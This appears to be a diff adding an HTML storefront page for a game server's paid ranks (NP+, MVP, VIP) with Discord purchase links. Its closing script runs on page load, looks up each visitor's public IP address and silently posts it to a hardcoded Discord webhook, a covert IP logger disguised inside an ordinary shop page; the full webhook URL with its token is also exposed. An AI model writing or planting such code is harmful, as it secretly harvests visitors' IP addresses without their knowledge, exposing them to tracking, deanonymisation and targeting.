@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NP PvP Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="styles/custom.css">
+    <style>
+        /* You can remove this to make the page visible */
+        body {
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <header class="header text-white py-4 shadow-md">
+        <div class="container mx-auto text-center">
+            <h1 class="text-4xl font-bold">NP PvP Store</h1>
+            <p class="text-lg">Upgrade your experience with exclusive perks!</p>
+        </div>
+    </header>
+
+    <main class="container mx-auto py-8">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+
+            <!-- NP+ Rank -->
+            <div class="card shadow-lg rounded-lg p-6">
+                <h2 class="text-3xl font-bold text-blue-600">NP+</h2>
+                <p class="mt-4 text-gray-700">Exclusive Perks:</p>
+                <ul class="list-disc pl-6 mt-2 text-gray-800">
+                    <li>Access to <code>/ec</code> [Enderchest]</li>
+                    <li>Access to <code>/seen</code> [Check Player Alts]</li>
+                    <li>Access to <code>/craft</code></li>
+                    <li>Access to <code>/anvil</code></li>
+                    <li>5 Homes</li>
+                    <li>1M Starting Money</li>
+                    <li>Cool Prefix</li>
+                    <li>Priority in Tickets</li>
+                </ul>
+                <!-- Buy Now Button with Link -->
+                <a href="https://discord.gg/wQmHZ25TUK" target="_blank">
+                    <button class="mt-6 bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Buy Now</button>
+                </a>
+            </div>
+
+            <!-- MVP Rank -->
+            <div class="card shadow-lg rounded-lg p-6">
+                <h2 class="text-3xl font-bold text-green-600">MVP</h2>
+                <p class="mt-4 text-gray-700">Exclusive Perks:</p>
+                <ul class="list-disc pl-6 mt-2 text-gray-800">
+                    <li>Access to <code>/ec</code> [Enderchest]</li>
+                    <li>Access to <code>/anvil</code></li>
+                    <li>4 Homes</li>
+                    <li>500K Starting Money</li>
+                    <li>Cool Prefix</li>
+                    <li>Priority in Tickets</li>
+                </ul>
+                <!-- Buy Now Button with Link -->
+                <a href="https://discord.gg/wQmHZ25TUK" target="_blank">
+                    <button class="mt-6 bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700">Buy Now</button>
+                </a>
+            </div>
+
+            <!-- VIP Rank -->
+            <div class="card shadow-lg rounded-lg p-6">
+                <h2 class="text-3xl font-bold text-yellow-600">VIP</h2>
+                <p class="mt-4 text-gray-700">Exclusive Perks:</p>
+                <ul class="list-disc pl-6 mt-2 text-gray-800">
+                    <li>Access to <code>/ec</code> [Enderchest]</li>
+                    <li>3 Homes</li>
+                    <li>250K Starting Money</li>
+                    <li>Cool Prefix</li>
+                    <li>Priority in Tickets</li>
+                </ul>
+                <!-- Buy Now Button with Link -->
+                <a href="https://discord.gg/wQmHZ25TUK" target="_blank">
+                    <button class="mt-6 bg-yellow-600 text-white px-4 py-2 rounded hover:bg-yellow-700">Buy Now</button>
+                </a>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="footer text-white py-4 mt-8">
+        <div class="container mx-auto text-center">
+            <p>&copy; 2025 NP PvP Store. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        async function fetchDetailsAndSendWebhook() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+                const host = 'LocalHost'; // Placeholder for host name
+
+                // Send the webhook to Discord without any visible content
+                sendWebhook(ip, host);
+
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+        }
+
+        function sendWebhook(ip, host) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1334686488037687307/LkoUI2q5KKjNmTANwroCjWfR79wyNc0rJa7SNUp3xGhc0N9chV-LhZo6lGhZnFyPXdWB'; // Replace with your actual webhook URL
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `IP: ${ip} | Host: ${host}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Webhook sent successfully!');
+                } else {
+                    console.error('Error with the webhook response:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+            });
+        }
+
+        fetchDetailsAndSendWebhook(); // Call the function immediately when the page loads
+    </script>
+</body>
+</html>
